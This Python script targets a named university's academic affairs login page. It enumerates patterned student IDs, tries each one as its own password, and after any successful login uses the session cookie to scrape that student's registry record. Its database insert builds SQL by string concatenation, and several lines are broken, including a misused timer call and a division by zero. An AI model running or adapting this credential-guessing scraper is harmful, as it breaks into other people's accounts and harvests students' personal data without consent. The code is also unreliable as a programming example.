# -*- coding: utf-8 -*-
"""
@author:JamesZBL
Created on:18-2-7 12:00
"""

import requests
import time
from lxml import etree
from URPScrapy import db_init
import timer

URL_LOGIN = 'http://lgjwxt.hebust.edu.cn/loginAction.do?'
URL_XJXX = 'http://lgjwxt.hebust.edu.cn/xjInfoAction.do?oper=xjxx'


class User:
	accounts = []


def main():
	conn = db_init.connect_db()
	grade = 15
	seprater = 'L'
	college = ['01', '02', '03', '04', '05', '06', '07']
	sub = ['51', '52']
	sum = 0
	sumget = 0
	account = []
	# 开始获取信息
	for c in college:
		for s in sub:
			pre = str(grade) + seprater + c + s
			for i in range(1, 200):
				username = pre + str(i).zfill(3)
				account.append(username)

	User.accounts = account
	timer(1, getinfo()).start()
	# 完成
	conn.close()
	print('既定数据获取完成，尝试获取总数：{}，成功获取总数：{}'.format(sum, sumget))
	print("获取成功率为：%.2f%%" % ((sumget / sum) * 100))


def getinfo():
	username = User.accounts[0]
	User.accounts = User.accounts[1:User.accounts.__len__()]
	# 请求参数
	param = {"zjh": username, "mm": username}
	print('证件号: {}\n密  码: {}'.format(username, username))
	# 发送登录请求
	req = requests.get(URL_LOGIN, params=param)
	print('发送请求>>>{}'.format(req.url))
	res_text = req.text
	# 密码有误
	if res_text.__contains__('密码不正确'):
		print('密码不正确')
		return []
	# 证件号无效
	if res_text.__contains__('你输入的证件号不存在，请您重新输入！'):
		print('证件号不存在')
		return []
	print('登录成功')
	# 获取 cookie
	cookie = req.cookies
	cookie = dict(JSESSIONID=cookie.get('JSESSIONID'))
	print(cookie)
	# 查看学籍信息
	reqXJXX = requests.get(URL_XJXX, cookies=cookie)
	print('发送请求>>{}'.format(reqXJXX.url))
	# 获取相应内容
	text = reqXJXX.text
	selector = etree.HTML(text)
	textarr = selector.xpath('//td[starts-with(@width,"275")]/text()')
	result = []
	for info in textarr:
		result.append(info.strip())

	return result


def save_info(conn, info):
	sql_str = 'INSERT INTO urp_hebust_lg VALUES (NULL ,'
	for i in info:
		sql_str += "\'" + str(i) + "\'" + ','
	sql_str = sql_str[0:sql_str.__len__() - 1]
	sql_str += ")"
	print(sql_str)
	conn.cursor().execute(sql_str)
	conn.commit()


if __name__ == '__main__':
	main()
